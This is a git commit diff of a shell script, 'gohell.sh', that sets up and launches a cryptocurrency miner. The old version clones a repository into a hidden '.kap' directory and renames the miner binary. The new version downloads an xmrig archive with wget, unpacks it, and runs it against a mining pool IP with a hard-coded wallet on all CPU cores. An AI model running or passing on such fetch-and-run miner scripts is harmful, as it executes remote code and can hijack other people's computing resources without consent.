57fcf23c0128610ba3ec050482136a71aa527c6d
nw4tw5 <154375286+nw4tw5@users.noreply.github.com>
2024-01-13 05:54:18 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -1,6 +1,3 @@
 #!/bin/bash
-mkdir .kap && cd .kap
-git clone https://github.com/nw4tw5/gradi.git
-cd gradi && mv zepo sgr1
-chmod +x sgr1 100.json
-./sgr1 --donate-level 1 -o 149.28.143.100:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o 149.28.143.100:443 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-30000 -n 1)-AJG) -a rx/0 -t $(nproc --all)
